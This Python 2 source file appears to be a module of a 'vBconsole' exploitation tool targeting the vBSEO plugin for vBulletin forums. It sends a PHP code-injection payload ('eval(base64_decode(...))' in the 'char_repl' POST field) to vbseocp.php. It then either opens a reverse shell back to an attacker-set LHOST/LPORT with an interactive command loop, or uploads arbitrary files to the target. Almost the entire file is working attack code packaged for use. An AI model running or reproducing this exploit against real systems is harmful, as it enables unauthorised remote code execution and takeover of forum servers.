#!/usr/bin/env python
from includes.termcolor import colored
import urllib
import urllib2
import httplib
import urlparse
import os.path
import socket
import time
import threading
from includes.prettytable import PrettyTable
from includes.php import check_vuln
from includes.php import upload
from includes.php import execute_reverse_shell
from includes.php import spawn_shell


def get_server_status_code(url):
    host, path = urlparse.urlparse(url)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request('HEAD', path)
        return conn.getresponse().status
    except StandardError:
        return False
 
def check_url(url):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(url) in good_codes

def reverse_dns_lookup(IP):
	try:
		return socket.gethostbyaddr(IP)
	except socket.herror:
		return "UKNOWN", None, None

def check_if_vuln(url):
	postdata = [
	('char_repl', '\'{${eval(base64_decode('+check_vuln()+'))}}\'=>')
	]
	postdata = urllib.urlencode(postdata)
	openurl = urllib2.urlopen(url, postdata)
	response = openurl.read()
	if response == 'Target is vulnerable':
		return True
	else:
		return False

def recv_timeout(the_socket,timeout=1):
    #make socket non blocking
    the_socket.setblocking(0)
     
    #total data partwise in an array
    total_data=[];
    data='';
     
    #beginning time
    begin=time.time()
    while 1:
        #if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break
         
        #if you got no data at all, wait a little longer, twice the timeout
        elif time.time()-begin > timeout*2:
            break
         
        #recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass
     
    #join all parts to make final string
    return ''.join(total_data)

def cwd(sock):
	sock.setblocking(1)
	sock.sendall('dir=null&command=get_cwd')
	return sock.recv(1024)

def open_execute_url(mode, url):
	postdata = [
	('char_repl', '\'{${eval(base64_decode('+execute_reverse_shell(mode)+'))}}\'=>')
	]
	postdata = urllib.urlencode(postdata)
	openurl = urllib2.urlopen(url, postdata)

def listen(port, mode, url):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', int(port)))
        sock.listen(1)
	print ("Listening on port: "+str(port))
	execute_thread = threading.Thread(target=open_execute_url, args=(mode, url))
	execute_thread.start()
	directory = "null"
	loop = 1
        while loop == 1:
            conn, sock_addr = sock.accept()
            print "Established connection with:", sock_addr[0]+":"+str(sock_addr[1])+" ("+reverse_dns_lookup(sock_addr[0])[0]+")"
	    print recv_timeout(conn)
            
	    while 1:
		getcwd = cwd(conn).strip('\n')
		try:
			command = raw_input(getcwd+'> ')
			if command[0:2] == 'cd':
				directory = command.split(' ')[-1]
				line = "dir="+directory+"&command="+command
			else:
				line = "dir="+directory+"&command="+command
	    		conn.sendall(line)
	    		receive = recv_timeout(conn)
			if receive == 'Cannot cd to: '+directory:
				directory = 'null'
				print (receive)
			else:
				if receive == '':
					pass
				else:
					print (receive.strip('\n'))
		except KeyboardInterrupt:
			conn.close()
			print ('\nGoing back to vBseo console')
			loop = 0
			break
        conn.close()
	
def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['PAYLOAD', 'PYSHELL', 'Payload to use. Use show payloads to see all payloads']
	]
	
	payloads = [
	['PYSHELL', 'Starts a reverse shell on target server via Python'],
	['UPLOAD', 'Upload local file to target server']
	]

	PYSHELL = [
	['LPORT', '7777', 'Local port'],
	['LHOST', 'Not Set', 'Local IP to connect to']
	]

	UPLOAD = [
	['LFILE', 'Not Set', 'Path to local file to upload'],
	['NAME', 'file.php', 'Name of file to save on server as']
	]
	
	def show_payload_vars(name):
		count = 0
		if name == 'PYSHELL':
			name = PYSHELL
		elif name == 'UPLOAD':
			name = UPLOAD
		while count < len(name):
			print (name[count][0]+" = "+name[count][1]+" ("+name[count][2]+")")
			count += 1

	print ('\nType help for more information')
	while True:
		try:
			vbseo = raw_input('vbconsole('+colored('/exploits/vbseo', 'red')+')> ')
			if vbseo == 'exit':
				print ("Going back to home.")
				break
			elif vbseo == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('get prefix ~> Looks for table prefix')
				print ('run ~> Run the exploit')
				print ('exit ~> Go back to vBconsole home')
			elif vbseo == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
				print ("-----------------------------------------------------------")
				print ("Payload ("+exvars[2][1]+") variables needed.\n")
				show_payload_vars(exvars[2][1])
			elif vbseo == 'show payloads':
				print ("Available payloads for exploit.\n")
				count = 0
				payloadtable = PrettyTable()
				payloadtable.field_names = ["Payload Name", "Description"]
				while count < len(payloads):
					payloadtable.add_row([payloads[count][0], payloads[count][1]])
					count += 1
				payloadtable.align["Payload Name"] = "l"
				payloadtable.align["Description"] = "l"
				print (payloadtable)
			elif vbseo[0:3] == 'set':
				setvar = vbseo.split(' ')[1]
				setval = vbseo.split(' ')[2:]
				payload = exvars[2][1]
				if payload == 'PYSHELL':
					paylist = PYSHELL
				elif payload == 'UPLOAD':
					paylist = UPLOAD
				count = 0
				count2 = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
				while count2 < len(paylist):
					if paylist[count2][0] == setvar:
						paylist[count2][1] = " ".join(setval)
					count2 += 1
			elif vbseo == 'run':
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"vbseocp.php"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"vbseocp.php"
				else:
					path = exvars[1][1]+"/vbseocp.php"
				url = host+path
				if check_url(url):
					if check_if_vuln(url):
						if exvars[2][1] == 'PYSHELL':
							LHOST = PYSHELL[1][1]
							LPORT = PYSHELL[0][1]
							postdata = [
							('char_repl', '\'{${eval(base64_decode('+spawn_shell(LHOST, LPORT)+'))}}\'=>')
							]
							postdata = urllib.urlencode(postdata)
							openurl = urllib2.urlopen(url, postdata)
							response = openurl.read()
							if response == '1':
								print ("The functions needed to start shell session are disabled!")
							elif response == '2':
								print ("Reverse shell created in /tmp!")
								listen(LPORT, 1, url)
							elif response == '3':
								print ("Failed to create shell in /tmp!")
							elif response == '4':
								print ("Reverse shell created in current directory!")
								listen(LPORT, 2, url)
							elif response == '5':
								print ("Failed to create shell in current directory!")
						elif exvars[2][1] == 'UPLOAD':
							localfile = UPLOAD[0][1]
							filename = UPLOAD [1][1]
							if os.path.isfile(localfile):
								postdata = [
								('char_repl', '\'{${eval(base64_decode('+upload(localfile, filename)+'))}}\'=>')
								]
								postdata = urllib.urlencode(postdata)
								openurl = urllib2.urlopen(url, postdata)
								response = openurl.read()
								print (response)
							else:
								print ("File does not exist!")
					else:
						print ('Target site is not vulnerable!')
				else:
					print ('vbseo could not be found at: '+url)
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
